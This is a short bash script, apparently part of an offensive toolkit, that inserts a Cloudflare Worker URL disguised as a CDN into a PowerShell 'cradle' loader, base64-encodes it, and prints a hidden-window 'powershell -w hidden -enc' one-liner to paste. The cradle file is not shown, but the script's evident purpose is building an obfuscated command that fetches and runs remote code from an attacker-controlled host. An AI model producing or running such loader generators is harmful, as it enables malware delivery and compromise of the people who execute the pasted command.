#!/bin/bash
# generates the ready-to-paste powershell one-liner
# usage: ./generate.sh <worker-url>
# example: ./generate.sh https://cdn-assets.mysite.workers.dev

set -e

URL="${1:?usage: $0 <cloudflare-worker-url>}"
URL="${URL%/}"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

CRADLE=$(cat "$SCRIPT_DIR/loader/cradle.ps1")
CRADLE="${CRADLE/\$U=\"https:\/\/cdn-assets.YOUR-DOMAIN.workers.dev\"/\$U=\"$URL\"}"

ENCODED=$(echo -n "$CRADLE" | iconv -f UTF-8 -t UTF-16LE | base64 -w0)

echo ""
echo "=== paste this into PowerShell ==="
echo ""
echo "powershell -w hidden -enc $ENCODED"
echo ""
